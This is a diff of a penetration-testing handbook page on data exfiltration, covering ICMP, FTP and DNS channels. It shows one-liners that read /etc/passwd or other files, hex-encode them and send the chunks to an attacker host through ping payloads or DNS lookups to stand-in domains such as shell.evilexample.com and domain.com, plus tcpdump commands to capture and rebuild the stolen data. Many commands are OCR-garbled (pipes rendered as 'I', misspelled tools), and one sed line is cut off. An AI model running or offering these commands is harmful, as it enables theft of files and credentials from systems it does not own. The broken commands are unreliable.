@@ -5,14 +5,8 @@
 **On victim \(never ending one liner\) :**
 
 ```text
-stringz-·cat /etc/passwd I od -tx1 I cut -c8- I tr -d " " I tr -d "\
-"'
-
-counter-0; while (($counter - ${#stringZ})} ;do ping -s 16 -c l -p
-
-{stringZ:counter:16} 192.168.10.10 &&
-
-counter=$( (counter+~6)) ;done
+stringz-·cat /etc/passwd I od -tx1 I cut -c8- I tr -d " " I tr -d "\"'
+counter-0; while (($counter - ${#stringZ})} ;do ping -s 16 -c l -p {stringZ:counter:16} 192.168.10.10 && counter=$( (counter+~6)) ;done
 ```
 
 **On the attacker host \(capture packets to data.dmp and parse}:**
@@ -28,7 +22,9 @@ Alternatively, use this tool:
 
 {% embed url="https://github.com/Vidimensional/Icmp-File-Transfer" %}
 
+Another alternative method can be found here:
 
+{% embed url="https://0xffsec.com/handbook/exfiltration/\#icmp" %}
 
 ## Transfer via FTP
 
@@ -101,41 +97,27 @@ sudo python -m pyftpdlib -p 21 -u user -P pass
 
 ## Transfer via DNS
 
-**On victim:**
-
-Hexcode the file to be transferred
+Capture DNS packets data.
 
 ```text
-xxd -p secret fi:e.hex
+sudo tcpdump -n -i wlan0 -w dns_exfil.pcap udp and src 10.0.0.3 and port 53
 ```
 
-Read in each line and do a DNS lookup
+Note: Remember to point the DNS resolution to where packages are being captured.
+
+Generate DNS queries.
 
 ```text
-forb in 'cat fole.hex '; do dig $[b.shell.evilexample.com](http://b.shell.evilexample.com); done
+xxd -p -c 16 filename.ext | while read h; do ping -c 1 ${h}.domain.com; done
 ```
 
-**On attacker:**
-
-Capture DNS exfil packets
+Extract exfiltrated data.
 
 ```text
-tcdpump -w /tmp/dns -sO port 53 and host [sjstem.example.com](http://sjstem.example.com)
+tcpdump -r dns-exfil.pcap 2>/dev/null | sed -e 's/.*\ \([A-Za-z0-9+/]*\).domain.com.*/
 ```
 
-Cut the exiled hex from the DNS packet
-
-```text
-tcpdump -r dnsdemo -n I grep [shell.evilexample.com](http://shell.evilexample.com) I cut -f9 -d'
-
-cut -fl -d'.' I uniq received. txt
-```
-
-Reverse the hex encoding
-
-```text
-xxd -r -p received.txt kefS.pgp
-```
+The example above was extracted from [here](https://0xffsec.com/handbook/exfiltration/#dns).
 
 ## Transfer via TFTP
 
